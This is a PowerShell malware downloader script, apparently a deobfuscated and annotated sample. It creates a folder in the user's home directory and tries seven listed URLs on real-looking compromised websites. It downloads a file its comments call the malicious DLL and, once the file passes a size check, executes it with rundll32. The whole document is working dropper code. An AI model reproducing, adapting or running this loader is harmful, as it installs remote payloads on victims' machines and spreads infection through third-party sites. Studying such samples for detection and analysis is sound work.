# Use .NET Directory class
Set-Variable -Name MKu -Value ([System.IO.Directory])

# Use .NET ServicePointManager class
Set-Variable -Name mbu -Value ([System.Net.ServicePointManager])

# Create working directory inside the user's home folder
$workDir = Join-Path $HOME "Db_bh30\Yf5be5g"
[System.IO.Directory]::CreateDirectory($workDir) | Out-Null

# Force TLS 1.2 for HTTPS connections
[System.Net.ServicePointManager]::SecurityProtocol = "Tls12"

# Path where the malicious DLL will be saved
$dllPath = Join-Path $workDir "A69S.dll"

# List of payload delivery URLs
$urls = @(
    "https://admintk.com/wp-admin/L/",
    "https://mikegeerinck.com/c/YYsa/",
    "https://freelancerwebdesignerhyderabad.com/cgi-bin/S/",
    "https://etdog.com/wp-content/nu/",
    "https://www.hintup.com.br/wp-content/dE/",
    "https://www.stmarouns.nsw.edu.au/paypal/b8G/",
    "https://wm.mcdevelop.net/content/6F2gd/"
)

# Try downloading the DLL from each URL
foreach ($url in $urls) {
    try {
        $client = New-Object System.Net.WebClient
        $client.DownloadFile($url, $dllPath)

        # Verify payload size (anti-404 / anti-junk check)
        if ((Get-Item $dllPath).Length -ge 35698) {

            # Execute the downloaded DLL
            rundll32.exe $dllPath,Control_RunDLL

            # Stop after first successful execution
            break
        }
    }
    catch {
        # Ignore errors and continue with next URL
    }
}